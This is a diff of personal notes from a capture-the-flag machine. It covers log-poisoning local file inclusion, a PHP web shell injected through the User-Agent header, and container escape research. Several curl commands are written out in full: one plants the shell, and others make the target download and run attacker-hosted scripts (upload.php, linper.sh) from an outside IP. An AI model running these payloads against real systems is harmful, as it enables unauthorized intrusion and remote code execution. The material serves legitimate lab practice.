@@ -167,6 +167,10 @@ rce via logs
 
 That did not work and the machine expired, taking a break
 
+## ctf reset 1
+
+### more recon
+
 Restarted the host and it is now at 10.10.143.216
 
 using double qoutes in the payload broke the access log
@@ -196,6 +200,8 @@ This is what returned
 ### initial foothold
 
 Uploaded revshell.php and executed it, got a basic reverse shell back
+
+`curl http://10.10.74.214/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=curl%20http%3A%2F%2F10.2.14.14%3A8000%2Fupload.php%20-o%20upload.php%3B%20php%20upload.php`
 
 got the first flag
 
@@ -234,11 +240,17 @@ system.container
 
 machine expired, taking a break
 
+## ctf reset 2
+
 new ip is 10.10.202.194
 
 bricked the access log and cannot figure out another LFI oppurtunity, restarting the host
 
+## ctf reset 3
+
 new ip is 10.10.121.150
+
+### re-establishing foothold
 
 payload to plant php rce in log file
 
@@ -258,7 +270,7 @@ Sec-GPC: 1
 
 ```
 
-payload to execute rce
+payload to execute rce *(notice c=id at the end)*
 
 ```
 GET /?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=id HTTP/1.1
@@ -303,9 +315,13 @@ Now need to find a container escape
     - basically any process/job that interfaces between host and container fs
 - obscure mount points? mounting a part of the host in the container? is that possible?
 
+## ctf reset 3
+
 new ip 10.10.42.190
 
-csing curl this time to plant rce, used burpsuite to buld curl request
+### making initial foothold scriptable w/ curl
+
+using curl this time to plant rce, used burpsuite to buld curl request
 
 `curl -i -s -k -X $'GET' -H $'Host: 10.10.42.190' -H $'User-Agent: <?php system($_GET[\'c\']); ?>' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://10.10.42.190/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' $'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log'`
 
@@ -322,6 +338,8 @@ it hangs so I guess not, downloading linper from our own webserver like last tim
 `curl 'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=curl%20http%3A%2F%2F10.2.14.14%3A8000%2Flinper.sh%20-o%20linper.sh'`
 
 using [this website](https://www.urlencoder.org/) to encode commands and use them in curl
+
+### presistence and privesc
 
 for some reason cannot execute linper - not sure why
 
@@ -340,8 +358,9 @@ for FILE in passwd group shadow gshadow; do
 done
 ```
 
-machine expired - going to do some research on this script to see how it is exploitable
+### offline research
 
+machine expired - going to do some research on this script to see how it is exploitable
 
 psuedo-code
 
@@ -358,7 +377,11 @@ if I can edit /var/backups/shadow, and monitor that file, then I should be able 
 
 can root in the container just `cat /etc/shadow`?
 
+## ctf reset 4
+
 new target IP 10.10.252.138
+
+### more scripting for initial foothold, regex
 
 using regex to make the web exploit pretty
 
@@ -367,11 +390,14 @@ using regex to make the web exploit pretty
 └──╼ $curl -s 'http://10.10.252.138/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log&c=uname%20-a' | grep "07/Mar/2021:03:00:55" | sed 's/.*http:\/\/10.10.42.190\/\" \"//g' | sed 's/Wed.*//g'
 ```
 
-so that passwd cron does not seem to be viable, I have access to all files involved and can jst cat /etc/shadow, which does not provide anything useful
+so that passwd cron does not seem to be viable, I have access to all files involved and can just cat /etc/shadow, which does not provide anything useful
+
+*re-stablished foothold with php file - technique described above*
+*escalated to root with sudo - technique described above*
 
 ### privesc to root (on host OS)
 
-ran linpeas from /root/ in container as root 
+ran linpeas from /root/ in container as root
 
 ```
 [+] Modified interesting files in the last 5mins (limit 100)
